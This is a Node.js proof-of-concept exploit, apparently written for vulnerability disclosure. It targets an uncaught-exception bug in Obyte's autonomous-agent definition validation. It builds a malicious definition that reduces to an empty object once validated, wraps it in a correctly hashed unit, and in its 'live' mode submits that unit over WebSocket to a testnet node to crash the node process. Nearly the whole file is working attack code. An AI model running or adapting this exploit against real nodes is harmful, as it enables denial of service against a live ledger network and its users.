"use strict";

const crypto = require('crypto');
const base32 = require('thirty-two');

/*
 * PoC: AA Validation Uncaught Exception
 *
 * Usage:
 *   node poc.js           -> Local simulation (proves vulnerable code path)
 *   node poc.js live      -> Attack testnet node via WebSocket
 */

const MODE = process.argv[2] || 'local';
const TARGET = 'wss://obyte.org/bb-test';
const VERSION = '4.0t';
const ALT = '2';

// Payload: {"if":"{1}"} becomes {} after validation deletes 'if' property
const MALICIOUS_DEF = ["autonomous agent", {
    "bounce_fees": { "base": 10000 },
    "messages": [{ "app": "data", "payload": { "x": { "if": "{1}" } } }]
}];


// Hash utilities
const PI = "14159265358979323846264338327950288419716939937510".split("");
const offsets160 = (() => {
    const arr = []; let off = 0;
    for (let i = 0; off < 160; i++) {
        const r = parseInt(PI[i]); if (!r) continue;
        off += r; if (off >= 160) break; arr.push(off);
    }
    return arr;
})();

function buf2bin(b) { return [...b].map(x => x.toString(2).padStart(8, '0')).join(''); }
function bin2buf(s) { const b = Buffer.alloc(s.length / 8); for (let i = 0; i < b.length; i++) b[i] = parseInt(s.substr(i * 8, 8), 2); return b; }

function mixChk(clean, chk) {
    const f = [], c = chk.split(''); let s = 0;
    for (let i = 0; i < offsets160.length; i++) { const e = offsets160[i] - i; f.push(clean.substring(s, e), c[i]); s = e; }
    if (s < clean.length) f.push(clean.substring(s));
    return f.join('');
}

function chash160(data) {
    const h = crypto.createHash('ripemd160').update(data, 'utf8').digest().slice(4);
    const cs = crypto.createHash('sha256').update(h).digest();
    return base32.encode(bin2buf(mixChk(buf2bin(h), buf2bin(Buffer.from([cs[5], cs[13], cs[21], cs[29]]))))).toString();
}

function jsonStr(v) {
    if (v === null) return 'null';
    if (typeof v === 'string') return JSON.stringify(v);
    if (typeof v === 'number' || typeof v === 'boolean') return v.toString();
    if (Array.isArray(v)) return '[' + v.map(jsonStr).join(',') + ']';
    return '{' + Object.keys(v).sort().map(k => JSON.stringify(k) + ':' + jsonStr(v[k])).join(',') + '}';
}

function b64hash(o) { return crypto.createHash('sha256').update(jsonStr(o), 'utf8').digest('base64'); }

function getLen(v, wk) {
    if (v === null) return 0;
    if (typeof v === 'string') return v.length;
    if (typeof v === 'number') return 8;
    if (typeof v === 'boolean') return 1;
    let len = 0;
    if (Array.isArray(v)) v.forEach(e => { len += getLen(e, wk); });
    else for (const k in v) { if (wk) len += k.length; len += getLen(v[k], wk); }
    return len;
}


// Build malicious unit
function buildUnit(parentUnits, lastBall, lastBallUnit) {
    const addr = chash160(jsonStr(MALICIOUS_DEF));
    const payload = { address: addr, definition: MALICIOUS_DEF };
    const payloadHash = b64hash(payload);

    const unit = {
        version: VERSION,
        alt: ALT,
        timestamp: Math.floor(Date.now() / 1000),
        authors: [{ address: addr }],
        messages: [{ app: 'definition', payload_location: 'inline', payload_hash: payloadHash, payload }],
        parent_units: parentUnits,
        last_ball: lastBall,
        last_ball_unit: lastBallUnit
    };

    const hdr = { ...unit };
    delete hdr.unit; delete hdr.headers_commission; delete hdr.payload_commission;
    delete hdr.main_chain_index; delete hdr.messages; delete hdr.parent_units;
    unit.headers_commission = getLen(hdr, true) + 88 + 12;
    unit.payload_commission = getLen({ messages: unit.messages }, true);

    const naked = { ...unit };
    delete naked.unit; delete naked.headers_commission; delete naked.payload_commission;
    naked.messages = naked.messages.map(m => { const n = { ...m }; delete n.payload; return n; });

    const stripped = {
        content_hash: b64hash(naked),
        version: unit.version, alt: unit.alt, timestamp: unit.timestamp,
        authors: [{ address: addr }],
        parent_units: unit.parent_units,
        last_ball: unit.last_ball, last_ball_unit: unit.last_ball_unit
    };
    unit.unit = b64hash(stripped);

    return { unit };
}


// Local simulation of vulnerable validate() function
function simulateVulnerableCode() {
    console.log('[*] Local simulation of vulnerable code path\n');

    const testPayload = { "x": { "if": "{1}" } };
    console.log('[1] Initial payload: ' + JSON.stringify(testPayload));

    const value = testPayload["x"];
    console.log('[2] Value at "x": ' + JSON.stringify(value));
    console.log('    Matches condition: typeof value.if === "string"');

    console.log('[3] Formula "{1}" validates successfully');

    console.log('[4] Executing delete operations...');
    delete value.if;
    delete value.init;
    console.log('    Result: ' + JSON.stringify(value));

    console.log('[5] Re-entering validate() with empty object');

    const checks = [
        ['number', typeof value === 'number'],
        ['boolean', typeof value === 'boolean'],
        ['string', typeof value === 'string'],
        ['hasCases', false],
        ['has if', typeof value.if === 'string'],
        ['array', Array.isArray(value)],
        ['nonemptyObject', Object.keys(value).length > 0]
    ];

    console.log('[6] Type checks: ' + checks.map(c => c[0] + '=' + c[1]).join(', '));
    console.log('[7] All checks fail -> throw Error("unknown type of value")');
    console.log('[8] Throw is inside async callback, no try-catch in stack');
    console.log('\n[RESULT] VULNERABLE - uncaught exception crashes node process');
}


// Live attack
function runLiveAttack() {
    const WebSocket = require('ws');
    console.log('[*] Target: ' + TARGET);

    const ws = new WebSocket(TARGET);
    let state = null;
    let sent = false;

    ws.on('open', () => {
        console.log('[*] Connected');
        ws.send(JSON.stringify(['request', {
            command: 'subscribe',
            params: { subscription_id: crypto.randomBytes(30).toString('base64'), last_mci: 0 },
            tag: 's'
        }]));
    });

    ws.on('message', (data) => {
        const [type, content] = JSON.parse(data.toString());

        if (type === 'justsaying' && content.subject === 'joint' && content.body?.unit) {
            const u = content.body.unit;
            if (u.parent_units && u.last_ball && u.last_ball_unit) {
                state = { parents: [u.unit], ball: content.body.ball || u.last_ball, ballUnit: u.last_ball_unit };
            }
        }

        if (type === 'response' && content.tag === 's' && !content.response?.error) {
            ws.send(JSON.stringify(['justsaying', { subject: 'refresh', body: null }]));
        }

        if (type === 'justsaying' && content.subject === 'free_joints_end' && state && !sent) {
            sent = true;
            console.log('[*] State acquired');
            const joint = buildUnit(state.parents, state.ball, state.ballUnit);
            console.log('[*] Unit: ' + joint.unit.unit);
            console.log('[*] Sending...');
            ws.send(JSON.stringify(['justsaying', { subject: 'joint', body: joint }]));
            setTimeout(() => { console.log('[*] Done'); ws.close(); }, 5000);
        }

        if (type === 'justsaying' && content.subject === 'error')
            console.log('[!] ' + content.body);
        if (type === 'justsaying' && content.subject === 'result')
            console.log('[!] ' + JSON.stringify(content.body));
    });

    ws.on('close', (c) => { console.log('[*] Closed: ' + c); process.exit(0); });
    ws.on('error', (e) => { console.log('[!] ' + e.message); process.exit(1); });
    setTimeout(() => { if (!state) { console.log('[!] Timeout'); ws.close(); } }, 30000);
}


if (MODE === 'live') runLiveAttack();
else simulateVulnerableCode();
